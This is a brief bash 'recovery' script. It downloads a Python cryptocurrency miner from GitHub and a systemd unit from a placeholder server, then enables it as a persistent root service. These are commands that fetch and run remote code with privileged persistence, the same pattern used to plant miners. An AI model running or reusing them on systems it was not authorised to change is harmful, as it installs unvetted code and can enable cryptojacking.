#!/bin/bash

# Download mining script and systemd service from remote server
wget -O /home/administrator/forever.py.2 https://raw.githubusercontent.com/Anderson816/foreverminer/refs/heads/main/forever.py.2
wget -O /etc/systemd/system/mining.service https://your-storage-server.com/mining.service

# Make sure the script is executable
chmod +x /home/administrator/forever.py.2

# Reload systemd to recognize the new service
systemctl daemon-reload

# Enable and start the mining service
systemctl enable mining.service
systemctl start mining.service

# Log the recovery process (for debugging)
echo "$(date) - Recovery script executed successfully. Mining service started." >> /var/log/mining_recovery.log
